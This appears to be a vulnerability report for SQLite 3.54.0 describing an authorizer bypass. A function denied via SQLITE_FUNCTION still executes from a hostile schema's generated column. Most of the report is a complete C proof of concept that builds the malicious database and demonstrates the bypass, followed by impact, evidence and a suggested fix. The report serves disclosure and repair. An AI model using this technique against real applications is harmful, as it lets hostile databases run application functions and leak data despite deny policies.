Summary
Schema initialization resolves generated-column expressions while authorizer
checks are suppressed. Later statement compilation reuses the stored
expression tree without issuing a new SQLITE_FUNCTION authorizer callback,
so a function that is denied in top-level SQL can still execute from hostile
schema.

Affected Area

SQLite version or Fossil check-in: 3.54.0 / dc4763b14c421710f2a19c19c1cac455c1d0
Build options or relevant feature flags: Default amalgamation build;
authorizer installed by the embedding application.
Component or source path: src/prepare.c, src/auth.c, and generated-column
code generation in src/expr.c.

Steps to Reproduce
The PoC creates an attacker database with a virtual generated column that calls
leak(a), then opens it as the victim, registers its own leak() callback,
and installs an authorizer that returns SQLITE_DENY for SQLITE_FUNCTION
callbacks naming leak. It first verifies that a direct
SELECT leak('direct-control') is denied, then reads the generated column with
SELECT b FROM t.

poc.c:
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sqlite3.h"

#ifndef POC_DIR
#define POC_DIR "."
#endif

#define DB_PATH POC_DIR "/evil.db"

static int g_authorizer_denials;
static int g_leak_calls;
static int g_victim_mode;

static void die(sqlite3 *db, const char *op, int rc) {
fprintf(stderr, "%s failed: rc=%d err=%s\n", op, rc, sqlite3_errmsg(db));
exit(1);
}

static int run_sql(sqlite3 *db, const char *sql) {
char *err = NULL;
int rc = sqlite3_exec(db, sql, NULL, NULL, &err);

printf("%s\n  rc=%d err=%s\n", sql, rc, err ? err : "<none>");
sqlite3_free(err);
return rc;
}

static void exec_sql(sqlite3 *db, const char *sql) {
char *err = NULL;
int rc = sqlite3_exec(db, sql, NULL, NULL, &err);

if (rc != SQLITE_OK) {
sqlite3_free(err);
die(db, "sqlite3_exec", rc);
}
sqlite3_free(err);
}

static void leak(sqlite3_context *ctx, int argc, sqlite3_value **argv) {
const char *value = (const char *)sqlite3_value_text(argv[0]);

(void)argc;
if (g_victim_mode) {
g_leak_calls++;
printf("  leak(%s)\n", value ? value : "<null>");
}
sqlite3_result_value(ctx, argv[0]);
}

static void register_leak(sqlite3 *db) {
int rc = sqlite3_create_function(
db,
"leak",
1,
SQLITE_UTF8 | SQLITE_DETERMINISTIC,
NULL,
leak,
NULL,
NULL);
if (rc != SQLITE_OK) {
die(db, "sqlite3_create_function", rc);
}
}

static int deny_leak(
void *unused,
int action,
const char *arg1,
const char *arg2,
const char *arg3,
const char *arg4) {
(void)unused;
(void)arg1;
(void)arg3;
(void)arg4;

if (action == SQLITE_FUNCTION && arg2 != NULL && strcmp(arg2, "leak") == 0) {
g_authorizer_denials++;
puts("  authorizer denied leak()");
return SQLITE_DENY;
}
return SQLITE_OK;
}

static void create_attacker_db(void) {
sqlite3 *db = NULL;
int rc;

remove(DB_PATH);
rc = sqlite3_open(DB_PATH, &db);
if (rc != SQLITE_OK) {
die(db, "sqlite3_open attacker", rc);
}

register_leak(db);
exec_sql(
db,
"CREATE TABLE t("
"  a TEXT,"
"  b TEXT GENERATED ALWAYS AS (leak(a)) VIRTUAL"
");"
"INSERT INTO t(a) VALUES('secret-from-row');");

sqlite3_close(db);
}

int main(void) {
sqlite3 *db = NULL;
int direct_rc;
int generated_rc;
int rc;

create_attacker_db();

rc = sqlite3_open(DB_PATH, &db);
if (rc != SQLITE_OK) {
die(db, "sqlite3_open victim", rc);
}

g_victim_mode = 1;
register_leak(db);
rc = sqlite3_set_authorizer(db, deny_leak, NULL);
if (rc != SQLITE_OK) {
die(db, "sqlite3_set_authorizer", rc);
}

puts("1. Direct function call:");
direct_rc = run_sql(db, "SELECT leak('direct-control')");

puts("2. Generated-column read:");
generated_rc = run_sql(db, "SELECT b FROM t");

printf(
"summary: authorizer_denials=%d leak_calls=%d\n",
g_authorizer_denials,
g_leak_calls);

sqlite3_close(db);

if (direct_rc == SQLITE_OK || generated_rc != SQLITE_OK) {
return 1;
}
if (g_authorizer_denials != 1 || g_leak_calls != 1) {
return 1;
}

return 0;
}

Expected Behavior
Any statement that would execute a denied function from a stored schema
expression should fail authorization before bytecode is emitted.

Actual Behavior
The harness denies SELECT leak('direct-control'), then executes
SELECT b FROM t without a second SQLITE_FUNCTION authorizer callback.
The generated-column read still invokes leak() with the stored row value.

Impact
Authorizer bypass: hostile database schema can invoke application-defined
functions with row-controlled data despite an explicit SQLITE_DENY policy,
causing side effects or data disclosure through those callbacks.

Evidence
During schema initialization, src/prepare.c and src/auth.c
suppress authorizer checks while CREATE statements are parsed. Later
generated-column code generation in src/expr.c reuses the resolved expression
and does not re-run sqlite3AuthCheck(..., SQLITE_FUNCTION, ...).

Suggested Fix
Re-run function authorization when compiling stored expressions that can reach
bytecode execution, rather than relying on schema-load resolution performed
with authorizer checks suppressed. Add authorizer regressions in
test/auth*.test and generated-column tests that deny a deterministic function
and require schema-stored calls to fail.

